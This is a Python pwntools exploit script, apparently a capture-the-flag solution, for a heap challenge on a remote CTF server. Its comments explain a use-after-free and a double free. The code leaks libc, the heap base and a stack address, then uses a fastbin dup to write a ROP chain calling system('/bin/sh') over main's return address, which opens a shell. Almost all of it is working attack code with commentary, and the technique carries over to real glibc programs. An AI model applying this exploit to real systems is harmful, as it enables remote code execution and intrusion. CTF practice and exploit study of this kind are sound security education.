'''
general info:
    this challenge uses a fastbin dup attack to overwrite a return address on the stack and achieve RCE.

bugs:
    - do_create() uses read() to write its data, which can abused to leak the previous contents of the heap chunk.
    - do_delete() leaves a dangling pointer at the index, which can cause a double free and a use after free when used with do_print()

limitations:
    - double free into tcache cannot be done here because of the random 64 bits key,
      this means that we will have to use fastbins instead.
    - when allocating from fastbins, it checks if the current chunk is the same as the next chunk (fwd),
      this can be avoided by adding an intermediate chunk between them
    - fastbins (and tcache) xor their fwd pointers with (heap_base >> 12), to overcome this we need to leak the heap base.
'''

from pwn import *

context.binary = elf = ELF('./chal')
libc = ELF("./libc.so.6")

# p = elf.process()
p = remote("chal.ctf.ingeniums.club", 1341)
assert p

def do_create(index, size, password):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b'index', str(index).encode())
    p.sendlineafter(b'size', str(size).encode())
    p.sendafter(b'password', password)

def do_print(index):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b'index', str(index).encode())

def do_delete(index):
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b'index', str(index).encode())

def do_edit(password):
    p.sendlineafter(b'>', b'4')
    p.sendlineafter(b'password', password)


'''
this function sets up the fastbins layout such as the next malloc'd chunk of size "size", would actually
be a pointer to "addr", from here we can either use it to leak the data or overwrite it.

since the first 7 chunks always go to the tcache (which we do not want), we first allocate 10 chunks,
7 to fill the tcache, and 2 for the actual usage, another chunk is needed because of .. reasons.

after that we free 7 chunks, this fills the tcache so the next chunks of the same size will go to fastbins instead,
we then free the chunk at index 7, then at index 8 (to avoid the detection we talked about earlier), then free 7 again.
now our heap should look like this:

tcache:
size| -> 7 useless chunks

fastbins:
size| -> (chunk7) -> (chunk8) -> (chunk7)
'''
def setup_chunks_for_dup(addr, size):

    for i in range(10):
        do_create(i, size, b'AAAA')

    for i in range(7):
        do_delete(i)

    do_delete(7)
    do_delete(8)
    do_delete(7)

    for i in range(7):
        do_create(i, size, b'AAAA')

    back = 16 if addr % 0x10 == 0 else 24
    do_create(0, size, p64((addr-back) ^ key))
    do_create(0, size, b'AAAA')
    do_create(0, size, b'AAAA')

def leak_addr(addr, size):
    setup_chunks_for_dup(addr, size)
    do_create(0, size, b'A'*24)
    do_print(0)
    val = u64(p.recvline()[26:-1].ljust(8, b'\x00'))
    return val


def overwrite_addr(addr, value, size):
    setup_chunks_for_dup(addr, size)
    do_create(0, size, value)


'''
step 1. libc leak
we create a chunk large enough such as freeing it will put it in the unsorted bin, where the fwd pointer will be a libc address,
then we can free it and use the UAF in do_print() to leak libc.
'''

do_create(0, 0x450, b'AAAA')
do_create(1, 16, b'BBBB') # needed to not merge with the top chunk
do_delete(0)
do_print(0)

libc.address = u64(p.recvline()[2:-1].ljust(8, b'\x00')) - 0x23eb20

log.info(f"libc @ {hex(libc.address)}")

'''
step 2. getting the heap base
let's say in your tcache you have a couple of chunks in a single linked list, the last chunk's fwd pointer would be NULL
but since it's xord with (heap_base >> 12), it will be the actual value we need (0 ^ x == x)
that means, we can use our UAF to leak the content of the last chunk in a list.
'''

do_delete(1)
do_print(1)

key = u64(p.recvline()[2:-1].ljust(8, b'\x00'))
log.info(f"heap @ {hex(key << 12)}")

'''
step 3. leaking a stack address
use fastbin dup to allocate a chunk at the address of environ and use do_print() to leak its value
'''
environ = leak_addr(libc.symbols['environ'], 64)

log.info(f"environ @ {hex(environ)}")

rop_target = environ - 0x110

r = ROP(libc)
r.raw(p64(0))
r.raw(r.find_gadget(["ret"]).address)
r.system(next(libc.search(b'/bin/sh\x00')))

'''
step 4. ROP
use fastbin dup to allocate a chunk at the return address of main and write a ROP chain there.
'''
overwrite_addr(rop_target, r.chain(), 88)

p.sendlineafter(b'>', b'4')

p.interactive()
